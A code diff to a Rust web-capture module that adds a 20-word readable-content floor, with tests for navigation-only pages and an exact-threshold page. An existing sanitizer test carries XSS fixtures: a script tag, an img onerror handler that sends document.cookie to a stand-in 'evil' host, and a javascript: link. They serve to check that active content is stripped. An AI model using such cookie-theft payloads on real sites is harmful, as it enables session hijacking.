@@ -4,6 +4,7 @@ use super::dom_cleanup::inject_dom_preprocessor;
 use super::{CaptureError, CaptureStage};
 
 const DEFUDDLE_JS: &str = include_str!("../defuddle.js");
+const MIN_READABLE_WORDS: i32 = 20;
 const ANTI_BOT_MARKERS: [&str; 4] = [
     "captcha-delivery.com/captcha",
     "datadome captcha",
@@ -108,10 +109,10 @@ pub(crate) fn defuddle_article_to_output(
         ind_html::sanitize_reader_html(&content)
     });
     let word_count = word_count_from_html(&content);
-    if word_count == 0 {
+    if word_count < MIN_READABLE_WORDS {
         return Err(CaptureError::other(
             CaptureStage::Defuddle,
-            anyhow::anyhow!("defuddle produced no visible readable content"),
+            anyhow::anyhow!("defuddle produced too little visible readable content"),
         ));
     }
 
@@ -178,7 +179,7 @@ mod tests {
     fn defuddle_output_strips_active_content_but_keeps_formatting() {
         let (html, _) = defuddle_article_to_output(
             article(
-                r#"<p>Hello <strong>world</strong></p>
+                r#"<p>Hello <strong>world</strong>; careful reporting preserves readable facts, context, evidence, examples, guidance, history, structure, links, images, headings, lists, quotations, and conclusions.</p>
                 <script>fetch('//evil')</script>
                 <img src="x" onerror="fetch('//evil/'+document.cookie)">
                 <a href="javascript:alert(1)">click</a>
@@ -195,5 +196,39 @@ mod tests {
         assert!(!html.contains("<iframe"), "{html}");
         // The doctype/body envelope the reader expects is preserved.
         assert!(html.starts_with("<!DOCTYPE html>"), "{html}");
+    }
+
+    #[test]
+    fn defuddle_output_rejects_navigation_chrome_below_readable_floor() {
+        let error = defuddle_article_to_output(
+            article(
+                r#"<nav>
+                <a href="/contest">Contents</a> <a href="/teachers">Teachers</a>
+                <a href="/signup">Sign up</a> <a href="/login">Log in</a>
+                <a href="/projects">Projects</a> <a href="/contests">Contests</a> <a href="/teachers">Teachers</a>
+                <a href="/login">Log In</a> <a href="/signup">Sign Up</a>
+                </nav>"#,
+            ),
+            Some("https://www.instructables.com/Big-Sturdy-Loft/"),
+        )
+        .expect_err("13 words of navigation chrome must not be published");
+
+        assert_eq!(
+            error.to_string(),
+            "defuddle: defuddle produced too little visible readable content"
+        );
+    }
+
+    #[test]
+    fn defuddle_output_accepts_exactly_twenty_visible_words() {
+        let (_, metadata) = defuddle_article_to_output(
+            article(
+                "<p>Careful reporting explains how communities restore wetlands, protect wildlife, measure progress, and share practical lessons with future generations across seasons.</p>",
+            ),
+            Some("https://example.com/wetlands"),
+        )
+        .expect("20 visible words meet the readable content floor");
+
+        assert_eq!(metadata.word_count, Some(20));
     }
 }
